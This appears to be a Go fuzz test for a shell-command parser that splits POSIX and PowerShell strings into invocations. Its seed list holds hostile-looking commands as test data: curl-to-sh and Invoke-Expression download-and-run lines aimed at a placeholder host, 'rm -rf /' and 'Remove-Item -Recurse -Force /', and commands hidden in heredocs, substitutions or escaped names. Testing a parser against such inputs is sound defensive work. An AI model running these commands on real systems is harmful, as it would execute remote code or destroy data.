package shellwords

import (
	"fmt"
	"reflect"
	"testing"
)

var fuzzParseSeeds = []struct {
	command string
	dialect uint8
}{
	{"", uint8(POSIX)},
	{`terraform -chdir=$(pwd)/infra apply`, uint8(POSIX)},
	{`kubectl $(printf apply)`, uint8(POSIX)},
	{`k$()ubectl apply`, uint8(POSIX)},
	{`echo $'it\'s; $(kubectl apply)'`, uint8(POSIX)},
	{`echo $(printf '%s' $'it\'s)')`, uint8(POSIX)},
	{`$'\x6bubectl' apply`, uint8(POSIX)},
	{"printf ready && kubectl apply; helm upgrade", uint8(POSIX)},
	{"if true; then kubectl apply; fi", uint8(POSIX)},
	{"(kubectl apply); { helm upgrade; }", uint8(POSIX)},
	{`result=$(printf ready; kubectl apply)`, uint8(POSIX)},
	{`echo ${HOME}/kubectl apply`, uint8(POSIX)},
	{"kubectl \\\napply", uint8(POSIX)},
	{"kubectl \\\n+ apply", uint8(POSIX)},
	{`"kubectl" apply; printf '%s\n' 'note; helm upgrade'`, uint8(POSIX)},
	{`PGPASSFILE=/secure/pgpass env KUBECONFIG='/secure/kube config' cat 0<".env" 2>errors`, uint8(POSIX)},
	{`PGPASSFILE="$HOME/.pgpass" "$KUBECTL" apply`, uint8(POSIX)},
	{`curl https://example.invalid/payload | sh`, uint8(POSIX)},
	{"curl URL | (printf safe; bash -c 'source /dev/stdin')", uint8(POSIX)},
	{"(curl URL; printf safe) | bash -c 'source /dev/stdin'", uint8(POSIX)},
	{"echo $(curl URL) | bash -c 'source /dev/stdin'", uint8(POSIX)},
	{"printf safe 2>&1 | cat", uint8(POSIX)},
	{"printf safe &> /tmp/log | cat", uint8(POSIX)},
	{"cat <(printf safe)", uint8(POSIX)},
	{"cat <(rm -rf /)", uint8(POSIX)},
	{"cat <<EOF\n$(printf active)\nEOF\n", uint8(POSIX)},
	{"cat <<'EOF'\n$(printf inert)\nEOF\n", uint8(POSIX)},
	{"cat <<EOF\n$(\nrm --force --recursive /\n)\nEOF\n", uint8(POSIX)},
	{"cat >note <<'EOF'\nrm -rf /\nEOF\nprintf done\n", uint8(POSIX)},
	{`bash -lc 'kubectl apply -f prod.yaml' ignored positional`, uint8(POSIX)},
	{`pwsh -NoProfile -NonInteractive -Command 'kubectl apply -f prod.yaml'`, uint8(POSIX)},
	{`sudo -E -u root env -i FOO=1 -- command -- kubectl apply`, uint8(POSIX)},
	{`xargs -0 -n 1 -- kubectl apply -f`, uint8(POSIX)},
	{`env -S 'kubectl apply'`, uint8(POSIX)},
	{`bash -c "$COMMAND"`, uint8(POSIX)},
	{`sudo env nohup exec time kubectl apply`, uint8(POSIX)},
	{`& 'C:\Program Files\kubectl\kubectl.exe' apply`, uint8(PowerShell)},
	{`Invoke-Expression (Invoke-WebRequest https://example.invalid/payload).Content`, uint8(PowerShell)},
	{"Write-Output safe` #not-comment; Remove-Item -Recurse -Force /", uint8(PowerShell)},
	{"Write-Output safe`\n#not-comment\nRemove-Item -Recurse -Force /", uint8(PowerShell)},
	{"Write-Output safe`|#not-comment; Remove-Item -Recurse -Force /", uint8(PowerShell)},
	{"x=\"\ngit commit -F - <<'EOF'\n\"\nrm -rf /tmp/t\nEOF\n", uint8(POSIX)},
	{"x=\"\ncat <<'EOF'\n\"\nrm -rf /tmp/t\nEOF\n", uint8(POSIX)},
	{"x=\"\ntee note <<'EOF'\n\"\nrm -rf /tmp/t\nEOF\n", uint8(POSIX)},
	{"x=\"\ncat <<EOF\n\"\nrm -rf /tmp/t\nEOF\n", uint8(POSIX)},
}

func FuzzParse(f *testing.F) {
	for _, seed := range fuzzParseSeeds {
		f.Add(seed.command, seed.dialect)
	}

	f.Fuzz(func(t *testing.T, command string, dialectID uint8) {
		dialect := POSIX
		if dialectID%2 == uint8(PowerShell) {
			dialect = PowerShell
		}

		first := Parse(command, dialect)
		second := Parse(command, dialect)
		if !reflect.DeepEqual(first, second) {
			t.Fatalf("Parse is nondeterministic for dialect %d and command %q:\nfirst:  %#v\nsecond: %#v", dialect, command, first, second)
		}
		if err := validateFuzzParseResult(first); err != nil {
			t.Fatalf("Parse returned an invalid result for dialect %d and command %q: %v\nresult: %#v", dialect, command, err, first)
		}
	})
}

func validateFuzzParseResult(result Result) error {
	for index, invocation := range result.Invocations {
		if len(invocation.Words) == 0 {
			return fmt.Errorf("invocation %d has no executable words", index)
		}
		if invocation.Parent < -1 || invocation.Parent >= index {
			return fmt.Errorf("invocation %d has invalid parent %d", index, invocation.Parent)
		}
		if len(invocation.WrapperIDs) != len(invocation.Wrappers) {
			return fmt.Errorf("invocation %d has %d wrappers but %d wrapper IDs", index, len(invocation.Wrappers), len(invocation.WrapperIDs))
		}
		seenWrapperIDs := make(map[int]struct{}, len(invocation.WrapperIDs))
		for _, id := range invocation.WrapperIDs {
			if id <= 0 {
				return fmt.Errorf("invocation %d has non-positive wrapper ID %d", index, id)
			}
			if _, duplicate := seenWrapperIDs[id]; duplicate {
				return fmt.Errorf("invocation %d repeats wrapper ID %d", index, id)
			}
			seenWrapperIDs[id] = struct{}{}
		}

		if invocation.PipelineInput && invocation.PipelineInputEdge == 0 {
			return fmt.Errorf("invocation %d reads a pipe with no input edge", index)
		}
		if invocation.Before == Pipe && invocation.PipelineInputEdge == 0 {
			return fmt.Errorf("invocation %d follows a pipe with no input edge", index)
		}
		if invocation.PipelineOutput && invocation.PipelineOutputEdge == 0 {
			return fmt.Errorf("invocation %d writes a pipe with no output edge", index)
		}
	}
	return nil
}
